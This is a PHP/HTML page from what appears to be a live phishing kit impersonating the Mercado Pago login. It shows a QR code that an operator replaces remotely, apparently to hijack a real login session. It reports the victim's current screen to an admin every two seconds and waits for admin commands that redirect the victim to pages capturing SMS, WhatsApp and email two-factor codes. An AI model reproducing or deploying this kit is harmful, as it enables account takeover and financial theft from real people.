<?php
// O topo do arquivo com a validação do cookie permanece o mesmo.
session_start();
require 'db.php';
if (!isset($_COOKIE['identificador_cliente'])) {
    header('Location: index.php');
    exit;
}

function isMobileDevice() {
    return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
}

// Define o alvo do redirecionamento com base no dispositivo
if (isMobileDevice()) {
    $redirect_target_2fa = 'dois_fatores.php';
} else {
    // Verifique se o nome do arquivo desktop é 'dois_fatores.php' ou 'dois_fatores2.php'
    $redirect_target_2fa = 'dois_fatores.php'; 
}

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Escaneie o QR para iniciar sessão de forma segura</title>
    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.73/mercadopago/favicon.svg" type="image/svg"/>
    
    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
    
    <style>
        :root {
            --andes-color-yellow-500: #ffe600;
            --andes-color-blue-500: #3483fa;
            --andes-text-color-primary: #333;
            --andes-text-color-secondary: #555;
            --andes-text-color-link: var(--andes-color-blue-500);
        }
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; display: flex; flex-direction: column; min-height: 100vh; background-color: var(--andes-background-color-secondary); }
        .main-header { background-color: #ffe600; padding: 0 680px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.1); height: 60px; display: flex; align-items: center; justify-content: flex-start;}
        .main-header img { height: 37px; vertical-align: middle; }
        .main-content { padding: 80px 24px; flex-grow: 1; }
        .content-wrapper { max-width: 960px; margin: 0 auto; display: flex; justify-content: center; align-items: flex-start; gap: 64px; }
        .left-column { display: flex; flex-direction: column; width: 340px; flex-shrink: 0; margin-right: 64px; }
        .session-start-label { font-size: 12px; font-weight: 600; color: var(--andes-text-color-secondary); text-transform: uppercase; margin-bottom: 8px; }
        .main-title { font-size: 28px; font-weight: 600; color: var(--andes-text-color-primary); line-height: 1.25; margin: 0; }
        .description-text { font-size: 16px; color: var(--andes-text-color-secondary); margin-top: 16px; line-height: 1.5; }
        .help-link { display: block; margin-top: 24px; color: var(--andes-text-color-link); text-decoration: none; font-size: 14px; font-weight: 500; }
        .help-link:hover { text-decoration: underline; }
        .qr-card { width: 100%; max-width: 38.75rem; height: 26.25rem; margin-top: 0; background-color: var(--andes-background-color-primary); box-shadow: 0 1px 4px 0 rgba(0,0,0,.1); border-radius: 6px; padding: 48px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        
        /* Estilo para o container do QR Code e para a imagem dentro dele */
        .qr-card .qr-image {
            width: 220px;
            height: 220px;
            margin-bottom: 32px;
            display: flex; /* Centraliza a imagem/código gerado */
            align-items: center;
            justify-content: center;
        }
        .qr-card .qr-image img {
             max-width: 100%;
             max-height: 100%;
        }
        .other-method-link { color: var(--andes-text-color-link); text-decoration: none; font-size: 15px; font-weight: 500; }
        .other-method-link:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <header class="main-header">
        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <div class="content-wrapper">
            <div class="left-column">
                <span class="session-start-label">INÍCIO DE SESSÃO</span>
                <h1 class="main-title">Escaneie o QR para iniciar sessão de forma segura</h1>
                <p class="description-text">Este passo é necessário para validar sua identidade e manter sua conta sempre protegida.</p>
                <a href="senha.php" class="help-link">Preciso de ajuda</a>
            </div>

            <div class="qr-card">
                <div id="qr-code-container" class="qr-image"></div>
                
                <a href="senha.php" class="other-method-link">Escolher outro método</a>
            </div>
        </div>
    </main>

    <script>
        const qrContainer = document.getElementById('qr-code-container');
        
        // VARIÁVEL DE ESTADO: Guarda o dado do QR Code atualmente na tela.
        let currentQrData = null; 

        // Função para mostrar uma imagem (quando vem da extensão)
        function displayQrImage(path) {
            qrContainer.innerHTML = ''; // Limpa o container
            const img = document.createElement('img');
            img.src = path + '?t=' + new Date().getTime(); // Timestamp para evitar cache
            img.alt = 'Código QR';
            qrContainer.appendChild(img);
        }

        // Função para gerar um QR Code a partir do texto (quando vem do admin)
        function generateQrFromText(text) {
            qrContainer.innerHTML = ''; // Limpa o container
            // Cria uma nova instância do QR Code dentro do container
            new QRCode(qrContainer, {
                text: text,
                width: 220,
                height: 220,
                colorDark: "#000000",
                colorLight: "#ffffff",
                correctLevel: QRCode.CorrectLevel.H
            });
        }

        // ---- LÓGICA DE VERIFICAÇÃO ATUALIZADA ----

        // Define o QR Code inicial e guarda seu estado
        const initialQrPath = '2.png';
        displayQrImage(initialQrPath);
        currentQrData = initialQrPath; // Guarda o caminho da imagem inicial no estado

        async function verificarQrCode() {
            try {
                const response = await fetch('api_get_qrcode.php');
                const data = await response.json();

                // A atualização SÓ ACONTECE se a API retornar sucesso E o dado for DIFERENTE do atual.
                if (data.success && data.data !== currentQrData) {
                    
                    console.log('Detectado novo QR Code. Atualizando a tela...');
                    
                    if (data.type === 'image') {
                        displayQrImage(data.data);
                    } else if (data.type === 'text') {
                        generateQrFromText(data.data);
                    }

                    // IMPORTANTE: Atualiza a variável de estado com o novo dado.
                    currentQrData = data.data;

                } else if (data.success && data.data === currentQrData) {
                    // Se o dado for o mesmo, não faz nada visualmente. A atualização é silenciosa.
                    console.log('QR Code verificado, sem alterações.');
                }

            } catch (error) {
                console.error('Erro ao buscar QR Code:', error);
            }
        }

        // Inicia a verificação a cada 3 segundos
        setInterval(verificarQrCode, 3000);
    </script>
    
    <script>
        (function() {
            // Mapa de nomes de arquivos para mensagens de status amigáveis.
            const statusMap = {
                'index.php': 'Usuário na tela Home (Desktop)',
                'login-mobile.php': 'Usuário na tela Home (Mobile)',
                'senha.php': 'Usuário na Tela de opções de login (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
                'senha-mobile.php': 'Usuário na Tela de opções de login (QRCODE/SMS/WHATSAPP/EMAIL)  (Mobile)',
                'dois_fatores.php': 'Usuário na Tela 2FA(autenticação de duas etapas) - Mensagem (Desktop)',
                'dois_fatores2.php': 'Usuário na Tela 2FA com opções de duas etapas (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
                'doisfatores2mobile.php': 'Usuário na Tela 2FA com opções de duas etapas (QRCODE/SMS/WHATSAPP/EMAIL) (Mobile)',
                'sms_desktop.php': 'Usuário na tela para logar com código no SMS (Desktop)',
                'sms_mobile.php': 'Usuário na tela para logar com código no SMS (Mobile)',
                'sms_whats_desktop.php': 'Usuário na tela para logar com código no SMS via WhatsApp (Desktop)',
                'sms_whats_mobile.php': 'Usuário na tela para logar com código no SMS via WhatsApp (Mobile)',
                'qrcode-mobile.php': 'Usuário na tela para logar com QR Code (Mobile)',
                'telaqr.php': 'Usuário na tela para logar com QR Code (Desktop)',
                'email2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no E-mail(Desktop)',
                'email2famobile.php': 'Usuário na tela para verificar duas etapas com código no E-mail(Mobile)',
                'emailsms_desktop.php': 'Usuário na tela para logar com código no E-mail (Desktop)',
                'emailsms_mobile.php': 'Usuário na tela para logar com código no E-mail (Mobile)',
                'sms2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no SMS (Desktop)',
                'sms2famobile.php': 'Usuário na tela para verificar duas etapas com código no SMS (Mobile)',
                'whats2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no WhatsApp (Desktop)',
                'whats2framobile.php': 'Usuário na tela para verificar duas etapas com código no WhatsApp (Mobile)'
            };

            const currentPage = window.location.pathname.split('/').pop();
            const currentStatus = statusMap[currentPage] || 'Página Desconhecida';

            async function sendStatusUpdate() {
                try {
                    await fetch('api_update_status.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ status: currentStatus })
                    });
                } catch (error) {
                    console.error('Falha ao enviar atualização de status:', error);
                }
            }
            sendStatusUpdate();
            setInterval(sendStatusUpdate, 2000);
        })();
    </script>
    <script>
        (function() {
            const redirectUrl = "<?php echo $redirect_target_2fa; ?>";
            async function checkAdminCommand() {
                try {
                    const response = await fetch('api_check_status.php');
                    const data = await response.json();
                    console.log('Status atual:', data.status); 
                    if (data.status === 'redirecionar_para_2fa') {
                        clearInterval(statusInterval);
                        console.log('Comando do admin recebido! Redirecionando para:', redirectUrl);
                        window.location.href = redirectUrl;
                    }
                } catch (error) {
                    console.error('Erro ao verificar status:', error);
                }
            }
            const statusInterval = setInterval(checkAdminCommand, 3000);
        })();
    </script>
</body>
</html>